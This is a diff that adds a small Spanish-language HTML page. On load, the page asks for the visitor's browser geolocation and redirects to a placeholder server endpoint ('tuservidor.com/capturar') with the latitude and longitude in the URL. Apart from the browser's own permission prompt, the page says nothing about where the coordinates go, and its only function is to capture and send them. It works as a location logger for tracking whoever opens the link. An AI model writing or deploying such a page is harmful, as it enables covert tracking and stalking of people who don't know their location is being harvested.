@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Obtener Ubicación</title>
+    <script>
+        function obtenerUbicacion() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(enviarUbicacion, mostrarError);
+            } else { 
+                alert("Geolocalización no es soportada por este navegador.");
+            }
+        }
+
+        function enviarUbicacion(position) {
+            var latitud = position.coords.latitude;
+            var longitud = position.coords.longitude;
+
+            // Enviar la ubicación al servidor
+            var enlace = "https://tuservidor.com/capturar?lat=" + latitud + "&long=" + longitud;
+            window.location.href = enlace;  // Redirigir a la URL que captura la ubicación
+        }
+
+        function mostrarError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("El usuario negó la solicitud de geolocalización.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("La información de ubicación no está disponible.");
+                    break;
+                case error.TIMEOUT:
+                    alert("La solicitud de ubicación ha expirado.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("Ha ocurrido un error desconocido.");
+                    break;
+            }
+        }
+    </script>
+</head>
+<body onload="obtenerUbicacion();">
+    <h1>Obteniendo ubicación...</h1>
+</body>
+</html>
